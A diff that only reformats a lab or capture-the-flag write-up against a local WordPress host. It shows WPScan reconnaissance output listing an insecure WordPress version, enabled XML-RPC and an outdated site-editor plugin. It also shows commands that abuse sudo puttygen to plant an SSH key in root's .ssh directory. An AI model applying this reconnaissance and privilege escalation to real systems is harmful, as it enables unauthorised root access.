@@ -55,11 +55,11 @@ Interesting Finding(s):
  | Confidence: 100%
  | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
  | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+ | - http://codex.wordpress.org/XML-RPC_Pingback_API
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
 [+] WordPress readme found: http://asucar.dl/readme.html
  | Found By: Direct Access (Aggressive Detection)
@@ -73,13 +73,13 @@ Interesting Finding(s):
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
+ | - https://www.iplocation.net/defend-wordpress-from-ddos
+ | - https://github.com/wpscanteam/wpscan/issues/1299
 
 [+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
  | Found By: Rss Generator (Passive Detection)
- |  - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
- |  - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
+ | - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
+ | - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 
 [+] WordPress theme in use: twentytwentyfour
  | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
@@ -99,7 +99,7 @@ Interesting Finding(s):
  |
  | Version: 1.1 (80% confidence)
  | Found By: Style (Passive Detection)
- |  - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'
+ | - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'
 
 [+] Enumerating All Plugins (via Passive Methods)
 [+] Checking Plugin Versions (via Passive and Aggressive Methods)
@@ -115,9 +115,9 @@ Interesting Finding(s):
  |
  | Version: 1.1 (100% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
+ | - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
- |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
+ | - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
  
 
 
@@ -129,7 +129,7 @@ So, important info would be the following:
 
 1. Apache/2.4.59 server(DEBIAN)
 2. XML-RPC enabled and directory listing enabled for `http://asucar.dl/wp-content/uploads`
-3. Site uses wordpress 6.5.3  with the `twentytwentyfour` theme.
+3. Site uses wordpress 6.5.3 with the `twentytwentyfour` theme.
 4. `site-editor` plugin not updated running version 1.1
 ```
 
@@ -207,7 +207,7 @@ We can run `puttygen`, `puttygen` is used to generate ssh keys, let's generate o
 
 `puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hacked`
 
-`puttygen -L ~/.ssh/hacked Â» ~/.ssh/authorized_keys`
+`puttygen -L ~/.ssh/hacked » ~/.ssh/authorized_keys`
 
 `sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/hacked
 `
